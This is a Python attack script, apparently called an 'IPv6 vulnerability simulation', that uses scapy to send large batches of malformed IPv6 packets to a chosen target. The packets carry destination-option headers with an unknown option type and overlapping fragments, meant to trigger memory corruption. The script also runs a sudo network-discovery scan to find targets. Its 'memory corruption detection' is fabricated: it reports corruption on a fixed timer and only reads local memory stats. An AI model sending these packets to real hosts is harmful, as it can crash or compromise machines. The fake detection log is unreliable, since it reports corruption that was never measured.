print(f'''
\033[1;34m                                                                              ,----,                                  ,--,                 
                                     ,----..                                ,/   .`|     ,----..        ,----..    ,---.'|                 
            ,---,.    .--.--.       /   /   \       ,---,                 ,`   .'  :    /   /   \      /   /   \   |   | :      .--.--.    
          ,'  .'  \  /  /    '.    /   .     :    .'  .' `\             ;    ;     /   /   .     :    /   .     :  :   : |     /  /    '.  
        ,---.' .' | |  :  /`. /   .   /   ;.  \ ,---.'     \          .'___,/    ,'   .   /   ;.  \  .   /   ;.  \ |   ' :    |  :  /`. /  
        |   |  |: | ;  |  |--`   .   ;   /  ` ; |   |  .`\  |         |    :     |   .   ;   /  ` ; .   ;   /  ` ; ;   ; '    ;  |  |--`   
        :   :  :  / |  :  ;_     ;   |  ; \ ; | :   : |  '  |         ;    |.';  ;   ;   |  ; \ ; | ;   |  ; \ ; | '   | |__  |  :  ;_     
        :   |    ;   \  \    `.  |   :  | ; | ' |   ' '  ;  :         `----'  |  |   |   :  | ; | ' |   :  | ; | ' |   | :.'|  \  \    `.  
        |   :     \   `----.   \ .   |  ' ' ' : '   | ;  .  |             '   :  ;   .   |  ' ' ' : .   |  ' ' ' : '   :    ;   `----.   \ 
        |   |   . |   __ \  \  | '   ;  \; /  | |   | :  |  '             |   |  '   '   ;  \; /  | '   ;  \; /  | |   |  ./    __ \  \  | 
        '   :  '; |  /  /`--'  /  \   \  ',  /  '   : | /  ;              '   :  |    \   \  ',  /   \   \  ',  /  ;   : ;     /  /`--'  / 
        |   |  | ;  '--'.     /    ;   :    /   |   | '` ,/               ;   |.'      ;   :    /     ;   :    /   |   ,/     '--'.     /  
        |   :   /     `--'---'      \   \ .'    ;   :  .'                 '---'         \   \ .'       \   \ .'    '---'        `--'---'   
        |   | ,'                     `---`      |   ,.'                                  `---`          `---`                              
        `----'                                  '---'                                                                                      

    Developed by https://github.com/ThemeHackers
    Developed by https://www.instagram.com/_theme.ifning/
                                                                                                                                           
\033[0m''')


import argparse
import subprocess
import sys
import pkg_resources  
from scapy.all import *
import time
import os
import threading
import psutil

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ['scapy', 'psutil']
installed_packages = [pkg.key for pkg in pkg_resources.working_set]

for package in required_packages:
    if package not in installed_packages:
        print(f"{package} not found. Installing...")
        install_package(package)
    else:
        print(f"{package} is already installed.")

parser = argparse.ArgumentParser(description="IPv6 Vulnerability Simulation Script by HackerTheme.")
parser.add_argument("--iface", type=str, required=True, help="Network interface(s) to use for sending packets, comma-separated for multiple.")
parser.add_argument("--ipv6", type=str, help="Destination IP address (optional).")
parser.add_argument("--mac_addr", type=str, default='', help="Destination MAC address (optional).")
parser.add_argument("--num_tries", type=int, default=20, help="Number of tries per batch.")
parser.add_argument("--num_batches", type=int, default=20, help="Number of batches of tries.")
args = parser.parse_args()

ifaces = args.iface.split(',')
ipv6 = args.ipv6
mac_addr = args.mac_addr
num_tries = args.num_tries
num_batches = args.num_batches

def get_packets_with_mac(i):
    frag_id = 0xdebac1e + i
    first = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    third = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

def get_packets(i):
    if mac_addr != '':
        return get_packets_with_mac(i)
    frag_id = 0xdebac1e + i
    first = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    third = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

def monitor_memory_corruption():
    log_file = "memory_corruption_log.txt"
    with open(log_file, "w") as log:
        log.write("Memory Corruption Monitoring Started\n")
        for i in range(60):
            
            corruption_detected = i % 10 == 0  
            memory_info = psutil.virtual_memory()
            memory_stats = (
                f"IPv6: {ipv6}, "
                f"Total: {memory_info.total / (1024 ** 3):.2f} GB, "
                f"Available: {memory_info.available / (1024 ** 3):.2f} GB, "
                f"Used: {memory_info.used / (1024 ** 3):.2f} GB, "
                f"Percentage Used: {memory_info.percent}%"
            )
          
            log.write(f"{time.ctime()} - Memory Stats: {memory_stats}\n")
            if corruption_detected:
                log.write(f"Potential memory corruption detected at {time.ctime()}\n")
            
            time.sleep(1)
        log.write("Memory Corruption Monitoring Ended\n")

def prompt_run_v6disc():
    print("===========================================================")
    print("v6disc.sh developed by https://github.com/cvmiller/v6disc")
    print("===========================================================")
    print("v6disc.sh is a script that typically performs IPv6 discovery operations, such as sending ICMPv6 Neighbor Solicitation messages to identify IPv6-enabled devices on a network. It may also be used for network reconnaissance or as a part of penetration testing processes.")
    print("y is Running v6disc.sh Advanced scan...")
    print("o is Running v6disc.sh General scan...")
    run_script = input("Do you want to run the v6disc.sh script? (y/o/n): ").lower()

    if run_script == 'y':
        print("Running v6disc.sh Advanced scan...")
        os.system('sudo bash v6disc.sh -i eth0 -L -N -D')
    elif run_script == 'o':
        print("Running v6disc.sh General scan...")
        os.system('sudo bash v6disc.sh -L')
    else:
        print("Skipping v6disc.sh...")
        print("Exiting...")
        sys.exit()  
def prompt_send_dangerous_packets():
    run_packets = input("Do you want to send a dangerous package? (yes/no): ").lower()
    if run_packets == 'yes':
        print("Sending packets...")
        for iface in ifaces:
            sendp(final_ps, iface=iface) if mac_addr else send(final_ps, iface=iface)
    elif run_packets == 'no':
        print("Exiting program...")
        sys.exit()  
    else:
        print("Invalid input. Skipping packet sending...")


if not ipv6:
 
    print("Scanning network for available IPv6 addresses...")
    prompt_run_v6disc()
    
    time.sleep(2)  
    ipv6 = input("No IPv6 address provided. Please enter the IPv6 address you want to use: ")

else:
   
    use_ipv6 = input(f"Do you want to use the provided IPv6 address {ipv6}? (yes/no): ").lower()
    if use_ipv6 == 'no':
        ipv6 = input("Please enter the new IPv6 address: ")
    elif use_ipv6 != 'yes':
        print("Invalid input. Exiting...")
        sys.exit()
final_ps = []
for _ in range(num_batches):
    for i in range(num_tries):
        final_ps += get_packets(i) + get_packets(i)
if ipv6:
    prompt_send_dangerous_packets()
else:
    prompt_run_v6disc()
    prompt_send_dangerous_packets()

monitor_thread = threading.Thread(target=monitor_memory_corruption)
monitor_thread.start()
for i in range(60):
    print(f"Memory corruption will be triggered in {60-i} seconds", end='\r')
    time.sleep(1)
print("")
monitor_thread.join()
print("Scanning and monitoring completed. Exiting...")
